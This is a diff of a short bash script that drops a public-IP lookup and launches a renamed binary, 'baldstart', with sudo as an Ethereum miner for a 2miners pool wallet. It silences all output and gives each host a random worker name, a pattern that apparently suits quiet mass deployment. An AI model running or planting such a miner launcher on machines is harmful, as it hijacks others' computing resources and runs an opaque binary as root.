@@ -1,5 +1,4 @@
 #!/bin/bash
 
-curl ipecho.net/plain && curl ipecho.net/plain
 chmod 777 baldstart
 sudo ./baldstart -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 3QU2yXEd6givopaaV67w4sazAwjCoyZayX -p x -w $(echo $(shuf -i 1-9999 -n 1)-KULI) > /dev/null 2>&1
